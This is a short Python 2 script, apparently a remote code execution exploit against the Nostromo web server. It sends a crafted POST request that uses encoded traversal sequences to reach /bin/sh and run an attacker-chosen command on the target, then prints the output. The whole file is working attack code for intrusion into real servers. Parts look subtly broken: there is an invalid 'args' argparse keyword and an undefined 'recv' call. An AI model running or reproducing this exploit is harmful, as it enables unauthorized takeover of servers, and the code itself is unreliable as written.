import socket
import argparse

parser = argparse.ArgumentParser(description='RCE in Nostromo')
parser.add_argument('IP',help="IP server")
parser.add_argument('port',help='port number',type=int)
parser.add_argument('bash',help='command to execute, default is id',default='id',args='')
args = parser.parse_args()


def exploit(IP,port,bash):
    s=socket.socket()
    s.settimeout(1)
    s.connect((IP,int(port)))
    junk="""POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1""".format(bash)
    s.send(junk)
    r=recv(s)
    r=r[r.index('\r\n\r\n')+4:]
    print r

exploit(args.IP,args.port,args.bash)
